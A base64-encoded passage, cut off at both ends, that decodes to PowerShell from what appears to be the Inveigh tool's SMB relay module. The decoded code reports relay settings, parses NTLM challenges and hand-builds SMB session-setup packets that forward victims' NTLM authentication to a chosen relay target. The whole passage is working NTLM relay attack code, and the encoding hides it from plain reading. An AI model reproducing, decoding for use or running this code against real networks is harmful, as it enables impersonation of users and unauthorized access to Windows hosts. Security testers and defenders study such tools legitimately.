QgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlJlYWwgVGltZSBGaWxlIE91dHB1dCBEaXNhYmxlZCIpfE91dC1OdWxsCiAgICB9CgogICAgaWYoJFJ1blRpbWUgLWVxIDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGUiKXxPdXQtTnVsbAogICAgfQogICAgZWxzZWlmKCRSdW5UaW1lIC1ndCAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlJ1biBUaW1lID0gJFJ1blRpbWUgTWludXRlcyIpfE91dC1OdWxsCiAgICB9Cn0KCiRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlNNQiBSZWxheSBFbmFibGVkIikgfE91dC1OdWxsCiRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlNNQiBSZWxheSBUYXJnZXQgPSAkU01CUmVsYXlUYXJnZXQiKXxPdXQtTnVsbAoKaWYoJFNNQlJlbGF5VXNlcm5hbWVzKQp7CiAgICBpZigkU01CUmVsYXlVc2VybmFtZXMuQ291bnQgLWVxIDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiU01CIFJlbGF5IFVzZXJuYW1lID0gIiArICRTTUJSZWxheVVzZXJuYW1lcyAtam9pbiAiLCIpfE91dC1OdWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiU01CIFJlbGF5IFVzZXJuYW1lcyA9ICIgKyAkU01CUmVsYXlVc2VybmFtZXMgLWpvaW4gIiwiKXxPdXQtTnVsbAogICAgfQp9CgppZigkU01CUmVsYXlBdXRvRGlzYWJsZSAtZXEgJ3knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJTTUIgUmVsYXkgQXV0byBEaXNhYmxlIEVuYWJsZWQiKXxPdXQtTnVsbAp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiU01CIFJlbGF5IEF1dG8gRGlzYWJsZSBEaXNhYmxlZCIpfE91dC1OdWxsCn0KCmlmKCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJTTUIgUmVsYXkgTmV0d29yayBUaW1lb3V0ID0gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgU2Vjb25kcyIpfE91dC1OdWxsCn0KCmlmKCRTaG93SGVscCAtZXEgJ3knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJVc2UgR2V0LUNvbW1hbmQgLU5vdW4gSW52ZWlnaCogdG8gc2hvdyBhdmFpbGFibGUgZnVuY3Rpb25zIil8T3V0LU51bGwKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlJ1biBTdG9wLUludmVpZ2ggdG8gc3RvcCBJbnZlaWdoIil8T3V0LU51bGwKICAgICAgICAKICAgIGlmKCRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlByZXNzIGFueSBrZXkgdG8gc3RvcCByZWFsIHRpbWUgY29uc29sZSBvdXRwdXQiKXxPdXQtTnVsbAogICAgfQp9CgppZigkaW52ZWlnaC5zdGF0dXNfb3V0cHV0KQp7CiAgICB3aGlsZSgkaW52ZWlnaC5zdGF0dXNfcXVldWUuQ291bnQgLWd0IDApCiAgICB7CiAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgIHsKICAgICAgICAgICAgd3JpdGUtb3V0cHV0KCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiUnVuIFN0b3AtSW52ZWlnaCB0byBzdG9wIEludmVpZ2giCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZygkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZS1vdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCiRwcm9jZXNzX0lEID0gW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzXTo6R2V0Q3VycmVudFByb2Nlc3MoKSB8U2VsZWN0LU9iamVjdCAtZXhwYW5kIGlkCiRwcm9jZXNzX0lEID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcHJvY2Vzc19JRCkpCiRwcm9jZXNzX0lEID0gJHByb2Nlc3NfSUQgLXJlcGxhY2UgIi0wMC0wMCIsIiIKW0J5dGVbXV0kaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzID0gJHByb2Nlc3NfSUQuU3BsaXQoIi0iKSB8IEZPUkVBQ0h7W0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KCiMgQmVnaW4gU2NyaXB0QmxvY2tzCgojIFNoYXJlZCBCYXNpYyBGdW5jdGlvbnMgU2NyaXB0QmxvY2sKJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2sgPQp7CiAgICBGdW5jdGlvbiBEYXRhVG9VSW50MTYoJGZpZWxkKQogICAgewoJICAgW0FycmF5XTo6UmV2ZXJzZSgkZmllbGQpCgkgICByZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRmaWVsZCwwKQogICAgfQoKICAgIEZ1bmN0aW9uIERhdGFUb1VJbnQzMigkZmllbGQpCiAgICB7CgkgICBbQXJyYXldOjpSZXZlcnNlKCRmaWVsZCkKCSAgIHJldHVybiBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJGZpZWxkLDApCiAgICB9CgogICAgRnVuY3Rpb24gRGF0YUxlbmd0aAogICAgewogICAgICAgIHBhcmFtIChbaW50XSRsZW5ndGhfc3RhcnQsW2J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBGdW5jdGlvbiBEYXRhVG9TdHJpbmcKICAgIHsKICAgICAgICBwYXJhbSAoW2ludF0kc3RyaW5nX2xlbmd0aCxbaW50XSRzdHJpbmcyX2xlbmd0aCxbaW50XSRzdHJpbmczX2xlbmd0aCxbaW50XSRzdHJpbmdfc3RhcnQsW2J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19kYXRhID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc3RyaW5nX2V4dHJhY3RfZGF0YVsoJHN0cmluZ19zdGFydCskc3RyaW5nMl9sZW5ndGgrJHN0cmluZzNfbGVuZ3RoKS4uKCRzdHJpbmdfc3RhcnQrJHN0cmluZ19sZW5ndGgrJHN0cmluZzJfbGVuZ3RoKyRzdHJpbmczX2xlbmd0aC0xKV0pCiAgICAgICAgJHN0cmluZ19kYXRhID0gJHN0cmluZ19kYXRhIC1yZXBsYWNlICItMDAiLCIiCiAgICAgICAgJHN0cmluZ19kYXRhID0gJHN0cmluZ19kYXRhLlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRzdHJpbmdfZXh0cmFjdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJHN0cmluZ19kYXRhLDAsJHN0cmluZ19kYXRhLkxlbmd0aCkKICAgICAgICByZXR1cm4gJHN0cmluZ19leHRyYWN0CiAgICB9Cn0KCiMgU01CIE5UTE0gRnVuY3Rpb25zIFNjcmlwdEJsb2NrIC0gZnVuY3Rpb24gZm9yIHBhcnNpbmcgTlRMTSBjaGFsbGVuZ2UvcmVzcG9uc2UKJFNNQl9OVExNX2Z1bmN0aW9uc19zY3JpcHRibG9jayA9CnsKICAgIEZ1bmN0aW9uIFNNQk5UTE1DaGFsbGVuZ2UKICAgIHsKICAgICAgICBwYXJhbSAoW2J5dGVbXV0kcGF5bG9hZF9ieXRlcykKCiAgICAgICAgJHBheWxvYWQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzKQogICAgICAgICRwYXlsb2FkID0gJHBheWxvYWQgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgJE5UTE1faW5kZXggPSAkcGF5bG9hZC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKCiAgICAgICAgaWYoJHBheWxvYWQuU3ViU3RyaW5nKCgkTlRMTV9pbmRleCArIDE2KSw4KSAtZXEgIjAyMDAwMDAwIikKICAgICAgICB7CiAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyA0OCksMTYpCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJE5UTE1fY2hhbGxlbmdlCiAgICB9Cn0KCiMgU01CIFJlbGF5IENoYWxsZW5nZSBTY3JpcHRCbG9jayAtIGdhdGhlcnMgTlRMTSBzZXJ2ZXIgY2hhbGxlbmdlIGZyb20gcmVsYXkgdGFyZ2V0CiRTTUJfcmVsYXlfY2hhbGxlbmdlX3NjcmlwdGJsb2NrID0KewogICAgRnVuY3Rpb24gU01CUmVsYXlDaGFsbGVuZ2UKICAgIHsKICAgICAgICBwYXJhbSAoJFNNQl9yZWxheV9zb2NrZXQsJEhUVFBfcmVxdWVzdF9ieXRlcykKCiAgICAgICAgaWYgKCRTTUJfcmVsYXlfc29ja2V0KQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtID0gJFNNQl9yZWxheV9zb2NrZXQuR2V0U3RyZWFtKCkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNAoKICAgICAgICAkaSA9IDAKICAgICAgICAKICAgICAgICA6U01CX3JlbGF5X2NoYWxsZW5nZV9sb29wIHdoaWxlICgkaSAtbHQgMikKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJGkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIDAgewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dICRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQgPSAoMHgwMCwweDAwLDB4MDAsMHgyZiwweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZilgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MGMsMHgwMCwweDAyLDB4NGUsMHg1NCwweDIwLDB4NGMsMHg0ZCwweDIwLDB4MzAsMHgyZSwweDMxLDB4MzIsMHgwMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMSB7IAogICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzEgPSAnMHh7MDpYMn0nIC1mICgkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDMyKQogICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzIgPSAnMHh7MDpYMn0nIC1mICgkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDIyKQogICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzMgPSAnMHh7MDpYMn0nIC1mICgkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgMzQpKQogICAgICAgICAgICAgICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9ICRTTUJfYmxvYl9sZW5ndGguU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDQ1KSkKICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgPSAkU01CX2J5dGVfY291bnQgLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgPSAkU01CX2J5dGVfY291bnQuU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAxMDQpKQogICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9ICRTTUJfbmV0Ymlvc19sZW5ndGguU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgW2FycmF5XTo6UmV2ZXJzZSgkU01CX25ldGJpb3NfbGVuZ3RoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dICRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQgPSAoMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX25ldGJpb3NfbGVuZ3RoYAogICAgICAgICAgICAgICAgICAgICAgICArICgweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfYmxvYl9sZW5ndGhgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NCwweDAwLDB4MDAsMHg4MClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9ieXRlX2NvdW50YAogICAgICAgICAgICAgICAgICAgICAgICArICgweDYwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX2xlbmd0aF8xYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDA2LDB4MDYsMHgyYiwweDA2LDB4MDEsMHgwNSwweDA1LDB4MDIsMHhhMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9sZW5ndGhfMmAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgzMCwweDNjLDB4YTAsMHgwZSwweDMwLDB4MGMsMHgwNiwweDBhLDB4MmIsMHgwNiwweDAxLDB4MDQsMHgwMSwweDgyLDB4MzcsMHgwMiwweDAyLDB4MGEsMHhhMilgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9sZW5ndGhfM2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwNClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9OVExNU1NQX2xlbmd0aGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkSFRUUF9yZXF1ZXN0X2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDU1LDB4NmUsMHg2OSwweDc4LDB4MDAsMHg1MywweDYxLDB4NmQsMHg2MiwweDYxLDB4MDApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5Xcml0ZSgkU01CX3JlbGF5X2NoYWxsZW5nZV9zZW5kLCAwLCAkU01CX3JlbGF5X2NoYWxsZW5nZV9zZW5kLmxlbmd0aCkKICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV90aW1lb3V0ID0gbmV3LXRpbWVzcGFuIC1TZWNvbmRzICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdG9wd2F0Y2ggPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RvcHdhdGNoLmVsYXBzZWQgLWdlICRTTUJfcmVsYXlfY2hhbGxlbmdlX3RpbWVvdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU01CIHJlbGF5IHRhcmdldCBkaWRuJ3QgcmVzcG9uZCB3aXRoaW4gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgc2Vjb25kcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhayBTTUJfcmVsYXlfY2hhbGxlbmdlX2xvb3AKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uUmVhZCgkU01CX3JlbGF5X2NoYWxsZW5nZV9ieXRlcywgMCwgJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMubGVuZ3RoKQoKICAgICAgICAgICAgJGkrKwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMKICAgIH0KfQoKIyBTTUIgUmVsYXkgUmVzcG9uc2UgU2NyaXB0QmxvY2sgLSBzZW5kcyBOVExNIHJlcG9uc2UgdG8gcmVsYXkgdGFyZ2V0CiRTTUJfcmVsYXlfcmVzcG9uc2Vfc2NyaXB0YmxvY2sgPQp7CiAgICBGdW5jdGlvbiBTTUJSZWxheVJlc3BvbnNlCiAgICB7CiAgICAgICAgcGFyYW0gKCRTTUJfcmVsYXlfc29ja2V0LCRIVFRQX3JlcXVlc3RfYnl0ZXMsJFNNQl91c2VyX0lEKQogICAgCiAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0CgogICAgICAgIGlmICgkU01CX3JlbGF5X3NvY2tldCkKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtID0gJFNNQl9yZWxheV9zb2NrZXQuR2V0U3RyZWFtKCkKICAgICAgICB9CgogICAgICAgICRTTUJfbGVuZ3RoXzEgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgMTIpKQogICAgICAgICRTTUJfbGVuZ3RoXzEgPSAkU01CX2xlbmd0aF8xIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9sZW5ndGhfMSA9ICRTTUJfbGVuZ3RoXzEuU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9sZW5ndGhfMiA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyA4KSkKICAgICAgICAkU01CX2xlbmd0aF8yID0gJFNNQl9sZW5ndGhfMiAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbGVuZ3RoXzIgPSAkU01CX2xlbmd0aF8yLlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfbGVuZ3RoXzMgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgNCkpCiAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICRTTUJfbGVuZ3RoXzMgLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2xlbmd0aF8zID0gJFNNQl9sZW5ndGhfMy5TcGxpdCgiLSIpIHwgRk9SRUFDSHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX05UTE1TU1BfbGVuZ3RoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCkpCiAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9ICRTTUJfTlRMTVNTUF9sZW5ndGggLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX05UTE1TU1BfbGVuZ3RoID0gJFNNQl9OVExNU1NQX2xlbmd0aC5TcGxpdCgiLSIpIHwgRk9SRUFDSHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDE2KSkKICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoLlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAyNykpCiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50IC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50LlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgODYpKQogICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9ICRTTUJfbmV0Ymlvc19sZW5ndGguU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgW2FycmF5XTo6UmV2ZXJzZSgkU01CX2xlbmd0aF8xKQogICAgICAgIFthcnJheV06OlJldmVyc2UoJFNNQl9sZW5ndGhfMikKICAgICAgICBbYXJyYXldOjpSZXZlcnNlKCRTTUJfbGVuZ3RoXzMpCiAgICAgICAgW2FycmF5XTo6UmV2ZXJzZSgkU01CX05UTE1TU1BfbGVuZ3RoKQogICAgICAgIFthcnJheV06OlJldmVyc2UoJFNNQl9uZXRiaW9zX2xlbmd0aCkKICAgICAgICAKICAgICAgICAkaiA9IDAKICAgICAgICAKICAgICAgICA6U01CX3JlbGF5X3Jlc3BvbnNlX2xvb3Agd2hpbGUgKCRqIC1sdCAxKQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJFNNQl9yZWxheV9yZXNwb25zZV9zZW5kID0gKDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICArICRTTUJfbmV0Ymlvc19sZW5ndGhgCiAgICAgICAgICAgICAgICArICgweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYpYAogICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgI